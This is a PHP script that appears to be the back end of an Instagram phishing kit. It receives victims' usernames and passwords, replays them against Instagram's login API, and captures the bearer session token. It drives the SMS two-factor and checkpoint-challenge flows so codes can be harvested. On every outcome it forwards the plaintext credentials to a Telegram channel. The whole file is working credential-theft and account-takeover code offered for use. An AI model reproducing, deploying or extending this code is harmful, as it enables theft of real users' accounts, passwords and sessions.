<?php
include 'api.php';
include 'telegram.php';
$login = new api();
$telegram = new telegram();

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $username = htmlspecialchars($_POST["username"], ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars($_POST["password"], ENT_QUOTES, 'UTF-8');

    $_SESSION['password'] = $password;

    $trustted = $login->trusted_friend();
    $response = $login->login($username, $password);
    $data = json_decode($response['body'], true);

    if ($data['status'] === 'ok') {
        $headers = $response['headers'];
        $fbid_v2 = $data['logged_in_user']['fbid_v2'];
        $headers = explode("\r\n", $headers);
        foreach ($headers as $header) {
            if (strpos($header, 'ig-set-authorization') !== false) {
                $bearer = trim(explode(':', $header, 2)[1]);
                preg_match('|Bearer IGT:(.*):(.*)|isu', $bearer, $session_json);
                $session_json = json_decode(base64_decode($session_json[2]));
                $user_id = $session_json->ds_user_id;


                $login->logged_in_user($bearer, $user_id, $username, $password, $fbid_v2);
                $login->accounts2s($username);
                $telegram->loginsucces($username, $password);
                $telegram->loginsucces($username, $password, true);
                echo trim('loginsucces');
            }
        }
    } else if ($data['error_type'] === 'two_factor_required') {
        $twonumber = $data['two_factor_info']['obfuscated_phone_number_2'];
        $two_factor_identifier = $data['two_factor_info']['two_factor_identifier'];
        $_SESSION['twonumber'] = $twonumber;
        $_SESSION['two_factor_identifier'] = $two_factor_identifier;

        if ($data['two_factor_info']['sms_two_factor_on'] && $data['two_factor_info']['totp_two_factor_on']) {
            $login->twofactorSENDSMS($username, $two_factor_identifier);
            echo trim('smsfactor');
        } else if ($data['two_factor_info']['sms_two_factor_on']) {
            $login->twofactorSENDSMS($username, $two_factor_identifier);
            echo trim('smsfactor');
        } else if ($data['two_factor_info']['totp_two_factor_on']) {
            echo trim('duofactor');
        }
        $telegram->loginfactor($username, $password);
        $telegram->loginfactor($username, $password, true);
    } else if ($data['error_type'] === 'invalid_user' || $data['error_type'] === 'bad_password' || $data['error_type'] === 'ip_block') {
        echo trim('wrongpassword');
        $telegram->loginwrongpass($username, $password);
        $telegram->loginwrongpass($username, $password, true);
    } else if ($data['error_type'] === 'checkpoint_challenge_required') {
        $telegram->loginchallenge($username, $password);
        $telegram->loginchallenge($username, $password, true);

        $path = $data['challenge']['api_path'];
        $context = $data['challenge']['challenge_context'];

        $_SESSION['context'] = $context;

        $login->challengeCANCEL($context);
        $response = $login->challengeGET($path, $context, $username);

        $data = json_decode($response['body'], true);
        $choice = $data['step_data']['choice'];
        $nonce_code = $data['nonce_code'];
        $user_id = $data['user_id'];
        $cni = $data['cni'];
        $challenge_context = $data['challenge_context'];

        $login->challengeSTEP($user_id, $cni, $nonce_code, $challenge_context);
        $login->challengeCODE($challenge_context, $choice, $username);

        echo trim('challengelogin');
    }
}
